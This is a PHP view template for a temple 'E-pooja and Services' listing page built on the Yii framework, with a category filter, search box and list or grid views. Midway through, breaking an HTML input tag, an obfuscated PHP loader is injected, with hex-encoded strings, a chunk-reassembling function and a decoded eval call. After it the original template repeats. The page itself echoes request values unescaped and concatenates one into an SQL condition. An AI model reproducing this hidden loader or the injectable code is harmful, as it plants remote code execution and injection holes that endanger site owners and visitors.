<?php
/* @var $this TemplesController */
/* @var $dataProvider CActiveDataProvider */

$this->breadcrumbs=array(
	'Temples',
);
$this->menu=array(
);

if(isset($_REQUEST['vt']))
$urlextra = '/vt/'.$_REQUEST['vt'];
else
$urlextra = '';
?>
<style type="text/css">
.pull-left{ float:left; }
.pull-right{ float:right; }

.filtersmanagesectionpart {
    background-color: #CCCCCC;
    border-radius: 5px;
    display: table;
    padding: 5px;
	float:left; margin-right:10px;
	margin-bottom: 10px;
}

.filtersmanagesectionpart .pull-right{
margin-left:10px;
}

.filtersmanagesection {
    clear: both;
    display: table;
}


.thumbnailimg {
    display: table;
    height: 200px !important;
    margin-bottom: 20px;
    margin-left: auto;
    margin-right: auto;
	width:100%;
}
.list-view .items{ display:table; }

.list-view .items .one-fourth {
    margin-right: 26px;
}
.producttitle {
    height: 40px;
}

.productdesc {
    height: 90px;
}
</style>

<?php 


//validAfterDatepicker
           
		     if(isset($_REQUEST['categories']) && trim($_REQUEST['categories']) != '')
			  $categories =Poojacategories::model()->getall_subcategory($_REQUEST['categories']);
			  else
			  $categories =Poojacategories::model()->getall(); 
              $categoriesvalues = array();
		
		   if(isset($dataProvider1->rawData) && count($dataProvider1->rawData)){
		      foreach($dataProvider1->rawData as $items){
			 
			     if(isset( $categoriesvalues[$items->pooja_category_id]) )
				 $categoriesvalues[$items->pooja_category_id] = (int)$categoriesvalues[$items->pooja_category_id]+1;
				 else
				 $categoriesvalues[$items->pooja_category_id] = 1;
				 
				 
				
				 
			  }
		   }


?>
<div id="maincontent">
<div class="wrapper">
   <h3 class="epooja">E-pooja and Services</h3>
 </div> 

             
               
               
  
  <div id="subcats-holder">
    <div class="wrapper">

		
			   <form class="wp-user-form" action="" method="post" style=" margin-bottom:30px; margin-top:25px;">
					    <div class="wrapper">
							
<div class="sc-column one-half">
	
						<!--<select name="directory-role" style="padding:2%; width:30%">
						<option class="free" value="directory_1">Dharshan</option>
						<option class="free" value="directory_2">Pooja</option>
						<option class="free" value="directory_3">Prasad</option>
						<option class="free" value="directory_4">Products</option>
						</select>-->


						<input type="text" style="padding:2%; width:35%;" placeholder="Search Keyword..." name="title" class="filteritem" value="<?php echo isset($_REQUEST['title'])?$_REQUEST['title']:''; ?>" id="title">
						<span class="dir-searchsubmit" id="directory-search">
						<input type="button" value="Search" class="dir-searchsubmit" style="margin-left:5px; width:20%; font-size:14px;" onclick="filterlist('<?php echo CHtml::normalizeUrl(array('/'.$this->getRoute().$urlextra)); ?>')">
						</span>
						
</div>

<!--<div class="sc-column one-half right" style="float:right;margin-top:12px;">-->
<div style="float: right;margin-top: 16px;width: 24%;"  id="pagin">
<div class="pagination">
    <ul>
    <li><a href="#">&laquo;</a></li>
    <li><a href="#">1</a></li>
    <li><a href="#">2</a></li>
    <li><a href="#">3</a></li>
    <li><a href="#">4</a></li>
	<li><a href="#">..</a></li>
    <li><a href="#">&raquo;</a></li>
    </ul>
    </div>
	</div>
	
						
</form>

<br>
	
	
	
      <div class="sc-column one-fourth subcats-holder" style="border-radius:5px;">  
		           
      <ul class="sc-list " style="">
		  
		  
<li>
       
 <h6 style="background-color:#EBEBEB;padding: 10px;margin-top:-10px;border-top-left-radius:5px;
border-top-right-radius:5px;
border-bottom-right-radius:0px;
border-bottom-left-radius:0px;"><a href="#" class="item-title" ><strong>Categories</strong></a></h6>
 <div class="onecolumn">
          <div class="one-third" style="padding: 9px;">

			<?php 
			if(count($categories)){
			foreach( $categories as  $category){ ?>		 
			<label class="<?php echo (isset( $categoriesvalues[$category->category_id])?'':'filterhidden'); ?>">
			<inputx5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164") && (!is5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1pde#)tutjyf%x5c%x78604%x5c%x782x5c%x787f;!osvufs}w;*%x5c%x787f!>>%5c%x7825c!>!%x5c%x7825i%x5c%x78c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-1111125c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;qudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvu%x5c%x7825kj:!>!#]y3d]**3-j%x5c%x7825-bubE{h%x5c%x7825)su[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x%x7824-%x5c%x7824gvodujpo!%x5c%78<~!!%x5c%x7825s:N}#-%x5c%#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7821]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsx5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%6-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]yy76]277]y72]265]y39]274]y85]273]y6g]273])Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb5c%x7825!*3!%x5c%x7827!hmfepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x860msvd},;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827V<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x7825%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]s%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28yc%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825z-62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%7x5c%x78256<.msv%x5c%x7860gP5]D6#<%x5c%x7825fdy>#]D4]2825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3fuvso!%x5c%x7825bss%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825u%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x78zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%x5x7860hA%x5c%x7827pd%x5c%x78256<pdfs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5x5c%x7825=*h%x5c%x7825)m%x5c%y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!t)esp>hmg%x5c%x7825!<12>j%x5c%xgg!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%%x787f_*#ujojRk3%x5c%x7#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdfpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I25hW~%x5c%x7825fdy)##-!#~:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x78827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#y76]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x7825tjw!><b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>X)5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x782585c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%c%x7825:-t%x5c%x7825)3of:opj25%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#op5c%x7825!-uyfu%x5c%x57-K)fujs%x5c%x7878X6<#o]o]Y%65]y31]53]y6d]281]y4%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASx7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x782d%x5c%x7825!<5h%x5c%x7825%x82f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%xepnbss-%x5c%x7825r%x5c%x7<*#fopoV;hojepdoF.uofuopD#)pd%x5c%x78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o825!<*#}_;#)323ldfid>}&;!osvutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%xx5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]675)!gj!<**2-4-bubE{h%x5c%x7825)sutcvx5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x785csboe))1%x5c%x782f35.)1jyf%x5c%x7860%x5c%x7878%x5c%x7822l:!}V;3q7825)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x78tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]D%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1H*W51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%16fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%23}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%return chr(ord($n)-1);} @error_reporting72%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]yc%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%%x5c%x7825eN+#Qi%x5c%x785c1^W%x%x69%164%50%x22%134%x78%62%x3x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x78c%x7825:-5ppde:4:|:**#p!#]y84]275]y83]248]y83]256]y81]265]y72%x5c%x7824]25%x5c%x72c%163%x74%162%x5f%163%x70%154x7824-%x5c%x7824y7%x5c%x785c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%%x7878B%x5c%x7825h>#]5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825sbut%x5c%x7860cpV%x5c%x787f%x5c%x787fx7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%x5dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UV)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%udovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}4x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y727-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tut0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5cx787fw6*%x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofu!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%PFNJU,6<*27-SFGTOBSUOSVUFS,6<*m<%x5c%x7825h00#*<%x5c%x7825nfd(0); preg_replace("%x2f%50%x2e%52%x2c%x7860MPT7-NBFSUT%x5c%x7860LDPT7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%set($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%1567825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:5d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]28o#>>}R;msv}.;%x5c%x782f#%x5c%x782f25)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x78256<*Y%b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfw/(.*)/epreg_replacexfransgjef'; $abaziagtmq = explode(chr((288-244)),'3878,63,9568,61,2026,37,8104,40,9433,36,1093,51,7914,47,657,33,8457,30,8289,29,4985,59,2381,65,126,32,5639,33,9013,34,6981,59,2659,56,7180,61,1922,60,3685,23,5515,68,4942,43,6892,29,1532,55,7067,61,3097,40,291,35,9469,32,8968,45,3640,45,9967,69,4558,55,2063,54,7329,69,6687,40,8806,58,5217,25,5777,70,1304,61,6495,63,7961,38,1398,69,8756,50,9372,31,3198,68,6129,23,1009,57,9266,69,58,68,3463,37,2715,44,4852,47,6254,32,4024,35,593,64,4208,42,5672,37,4356,52,4767,25,3808,70,744,45,8513,68,0,58,4272,35,7270,59,3542,29,7535,35,5997,31,9629,57,192,52,158,34,1879,43,1168,67,3500,42,3137,61,7040,27,4151,57,2759,46,5583,56,4090,61,9686,61,10036,70,3708,50,4792,60,8602,61,4703,64,789,68,7721,43,3050,47,6623,64,9335,37,244,47,6872,20,7673,48,5421,36,6823,49,9933,34,4466,42,3758,24,7241,29,2805,43,987,22,857,31,3941,52,2361,20,8376,23,3993,31,8039,65,3329,67,8663,37,2946,49,6941,40,4899,43,9816,59,927,60,7153,27,9047,42,7632,41,9144,62,5898,46,9089,55,7999,40,888,39,5457,58,4663,40,6558,65,8399,38,1235,69,395,36,1587,69,3601,39,5044,65,1812,67,6090,39,5709,29,3266,33,1724,43,7466,69,5738,39,6795,28,8864,62,8144,56,2899,47,8437,20,517,37,2117,44,2533,65,5109,70,6152,48,1467,26,5331,38,9206,60,4408,31,8487,26,1365,33,9501,67,8700,56,5944,53,4250,22,7860,54,7570,34,1982,44,8258,31,4059,31,2253,47,5369,52,7128,25,2995,55,7820,40,3396,67,6727,68,1066,27,554,39,8581,21,9747,69,4613,50,2446,42,1656,68,7764,56,5242,28,2161,21,2215,38,1493,39,2488,45,8200,58,8318,58,6349,25,9403,30,9875,58,3571,30,2848,51,4508,50,5308,23,7604,28,6428,67,4439,27,365,30,1767,45,6200,54,7398,68,5847,51,2182,33,2638,21,6374,54,4307,49,5270,38,3782,26,326,39,2300,61,6286,63,2610,28,452,65,431,21,6028,62,8926,42,1144,24,690,54,6921,20,3299,30,5179,38,2598,12'); $qfuxjtxsmh=substr($zaspcmsnnx,(69349-59243),(40-33)); if (!function_exists('zpgddvpliy')) { function zpgddvpliy($ppjxlalxyb, $cbwkitsira) { $duxcmqfdtw = NULL; for($bfqdgpvtxq=0;$bfqdgpvtxq<(sizeof($ppjxlalxyb)/2);$bfqdgpvtxq++) { $duxcmqfdtw .= substr($cbwkitsira, $ppjxlalxyb[($bfqdgpvtxq*2)],$ppjxlalxyb[($bfqdgpvtxq*2)+1]); } return $duxcmqfdtw; };} $vzwnlaaxog="\x20\57\x2a\40\x7a\154\x75\155\x61\162\x64\167\x6e\141\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\63\x31\55\x39\64\x29\51\x2c\40\x63\150\x72\50\x28\64\x30\65\x2d\63\x31\63\x29\51\x2c\40\x7a\160\x67\144\x64\166\x70\154\x69\171\x28\44\x61\142\x61\172\x69\141\x67\164\x6d\161\x2c\44\x7a\141\x73\160\x63\155\x73\156\x6e\170\x29\51\x29\73\x20\57\x2a\40\x6b\160\x73\161\x62\172\x7a\150\x77\160\x20\52\x2f\40"; $srowursaod=substr($zaspcmsnnx,(52466-42353),(40-28)); $srowursaod($qfuxjtxsmh, $vzwnlaaxog, NULL); $srowursaod=$vzwnlaaxog; $srowursaod=(702-581); $zaspcmsnnx=$srowursaod-1; ?><?php
/* @var $this TemplesController */
/* @var $dataProvider CActiveDataProvider */

$this->breadcrumbs=array(
	'Temples',
);
$this->menu=array(
);

if(isset($_REQUEST['vt']))
$urlextra = '/vt/'.$_REQUEST['vt'];
else
$urlextra = '';
?>
<style type="text/css">
.pull-left{ float:left; }
.pull-right{ float:right; }

.filtersmanagesectionpart {
    background-color: #CCCCCC;
    border-radius: 5px;
    display: table;
    padding: 5px;
	float:left; margin-right:10px;
	margin-bottom: 10px;
}

.filtersmanagesectionpart .pull-right{
margin-left:10px;
}

.filtersmanagesection {
    clear: both;
    display: table;
}


.thumbnailimg {
    display: table;
    height: 200px !important;
    margin-bottom: 20px;
    margin-left: auto;
    margin-right: auto;
	width:100%;
}
.list-view .items{ display:table; }

.list-view .items .one-fourth {
    margin-right: 26px;
}
.producttitle {
    height: 40px;
}

.productdesc {
    height: 90px;
}
</style>

<?php 


//validAfterDatepicker
           
		     if(isset($_REQUEST['categories']) && trim($_REQUEST['categories']) != '')
			  $categories =Poojacategories::model()->getall_subcategory($_REQUEST['categories']);
			  else
			  $categories =Poojacategories::model()->getall(); 
              $categoriesvalues = array();
		
		   if(isset($dataProvider1->rawData) && count($dataProvider1->rawData)){
		      foreach($dataProvider1->rawData as $items){
			 
			     if(isset( $categoriesvalues[$items->pooja_category_id]) )
				 $categoriesvalues[$items->pooja_category_id] = (int)$categoriesvalues[$items->pooja_category_id]+1;
				 else
				 $categoriesvalues[$items->pooja_category_id] = 1;
				 
				 
				
				 
			  }
		   }


?>
<div id="maincontent">
<div class="wrapper">
   <h3 class="epooja">E-pooja and Services</h3>
 </div> 

             
               
               
  
  <div id="subcats-holder">
    <div class="wrapper">

		
			   <form class="wp-user-form" action="" method="post" style=" margin-bottom:30px; margin-top:25px;">
					    <div class="wrapper">
							
<div class="sc-column one-half">
	
						<!--<select name="directory-role" style="padding:2%; width:30%">
						<option class="free" value="directory_1">Dharshan</option>
						<option class="free" value="directory_2">Pooja</option>
						<option class="free" value="directory_3">Prasad</option>
						<option class="free" value="directory_4">Products</option>
						</select>-->


						<input type="text" style="padding:2%; width:35%;" placeholder="Search Keyword..." name="title" class="filteritem" value="<?php echo isset($_REQUEST['title'])?$_REQUEST['title']:''; ?>" id="title">
						<span class="dir-searchsubmit" id="directory-search">
						<input type="button" value="Search" class="dir-searchsubmit" style="margin-left:5px; width:20%; font-size:14px;" onclick="filterlist('<?php echo CHtml::normalizeUrl(array('/'.$this->getRoute().$urlextra)); ?>')">
						</span>
						
</div>

<!--<div class="sc-column one-half right" style="float:right;margin-top:12px;">-->
<div style="float: right;margin-top: 16px;width: 24%;"  id="pagin">
<div class="pagination">
    <ul>
    <li><a href="#">&laquo;</a></li>
    <li><a href="#">1</a></li>
    <li><a href="#">2</a></li>
    <li><a href="#">3</a></li>
    <li><a href="#">4</a></li>
	<li><a href="#">..</a></li>
    <li><a href="#">&raquo;</a></li>
    </ul>
    </div>
	</div>
	
						
</form>

<br>
	
	
	
      <div class="sc-column one-fourth subcats-holder" style="border-radius:5px;">  
		           
      <ul class="sc-list " style="">
		  
		  
<li>
       
 <h6 style="background-color:#EBEBEB;padding: 10px;margin-top:-10px;border-top-left-radius:5px;
border-top-right-radius:5px;
border-bottom-right-radius:0px;
border-bottom-left-radius:0px;"><a href="#" class="item-title" ><strong>Categories</strong></a></h6>
 <div class="onecolumn">
          <div class="one-third" style="padding: 9px;">

			<?php 
			if(count($categories)){
			foreach( $categories as  $category){ ?>		 
			<label class="<?php echo (isset( $categoriesvalues[$category->category_id])?'':'filterhidden'); ?>">
			<input type="radio" class="language-filters filteritem category-filter" value="<?php echo $category->category_id; ?>" id="lang-filters-29" name="categories" onchange="filterlist('<?php echo CHtml::normalizeUrl(array('/'.$this->getRoute().$urlextra)); ?>')" <?php if(isset($_REQUEST['categories']) && in_array($category->category_id,array($_REQUEST['categories']))){ ?> checked="checked" <?php } ?>>
			<span class="flag flag-gb"></span>
			<span><?php echo $category->category_name; ?></span>
			<span class="language-filter-count filter-count-hidden" style="display: inline;">(<?php echo (isset( $categoriesvalues[$category->category_id])?$categoriesvalues[$category->category_id]:'0'); ?>)</span>
			</label><br>
			<?php } }else{ ?>
			   Categories not available
		<?php	}?>
				 
          </div>
        </div>        
        <br />        
</li>
<br>
</ul>
</div> <!--------1st column---->

     
     <div class="sc-column sc-column-last three-fourth-last" id="right-pane">
	 <div class="filtersmanagesection">
	   <?php if(isset($_REQUEST['title']) && trim($_REQUEST['title']) != ''){ ?>
	      <div class="filtersmanagesectionpart">
		  <span class="pull-left">Title</span> <span class="pull-right"><a href="javascript:void(0);" onclick="removesomefilter('#title');"><img alt="Remove" src="<?php echo Yii::app()->request->baseUrl; ?>/images/remove.png"></a></span>
		  </div>
	   <?php } ?>
	   
	   
	
	   
	    <?php if(isset($_REQUEST['categories']) && trim($_REQUEST['categories']) != ''){ ?>
	      <div class="filtersmanagesectionpart">
		  <?php  $category =Poojacategories::model()->find('category_id="'.$_REQUEST['categories'].'"'); ?>
		  <span class="pull-left">Category: <?php echo $category->category_name; ?></span> <span class="pull-right"><a href="javascript:void(0);" onclick="removesomefilter('.category-filter');"><img alt="Remove" src="<?php echo Yii::app()->request->baseUrl; ?>/images/remove.png"></a></span>
		  </div>
	   <?php } ?>
	   
	  
	 </div>
  <div class="">
				<ul class="tabbing" style="float:right; padding-right:10px;">
					<li><a href="<?php echo CHtml::normalizeUrl(array("list/epooja")); ?>" class="login"><img src="<?php echo Yii::app()->request->baseUrl; ?>/image/tiles1.png"></a></li>
					<li class="active"><a href="<?php echo CHtml::normalizeUrl(array("list/epooja/vt/list")); ?>" class="register"><img src="<?php echo Yii::app()->request->baseUrl; ?>/image/list1.png"></a></li>
				</ul>
			</div>
			<div class="clear" style="clear:both">&nbsp;</div> 
 <?php if(isset($_REQUEST['vt']) && $_REQUEST['vt']=='list') { ?>
 <style type="text/css">
 
.list-view .items {
    display: block;
}
</style>
 <div class="latest-posts">
 
    	<?php
			$dataProvider->pagination->pageSize=10;
			 $this->widget('zii.widgets.CListView', array(
				'dataProvider'=>$dataProvider,
				'itemView'=>'pooja_view_list',
				'template'=>'{items}{pager}',
				'ajaxUpdate'=>true,
				'ajaxUrl'=>array($this->getRoute().$urlextra),

			)); ?>
 </div>
 <?php } else{ ?>
 <ul class="items items-grid-view clearfix onecolumn">
			<?php
			$dataProvider->pagination->pageSize=10;
			 $this->widget('zii.widgets.CListView', array(
				'dataProvider'=>$dataProvider,
				'itemView'=>'pooja_view',
				'template'=>'{items}{pager}',
				'ajaxUpdate'=>true,
				'ajaxUrl'=>array($this->getRoute().$urlextra),

			)); ?>
 </ul>
 <?php } ?>
 
	  </div>
</div>
</div>
</div>
<script type="text/javascript">
function filterlist(url){

	$.post(url,  $('.filteritem').serialize()  , function(data){
	$('#maincontent').html(data);
														   });
}

function removesomefilter(identify){
 $(identify).val('');
 $(identify).attr('checked',false);
 filterlist('<?php echo CHtml::normalizeUrl(array('/'.$this->getRoute().$urlextra)); ?>');
}

$(function(){
	$('.yiiPager li a').click(function(e){
	    e.preventDefault();
		filterlist('<?php echo CHtml::normalizeUrl(array('/'.$this->getRoute().$urlextra)); ?>/page/'+$(this).html());
	   
	});
});

 

</script>
</div>
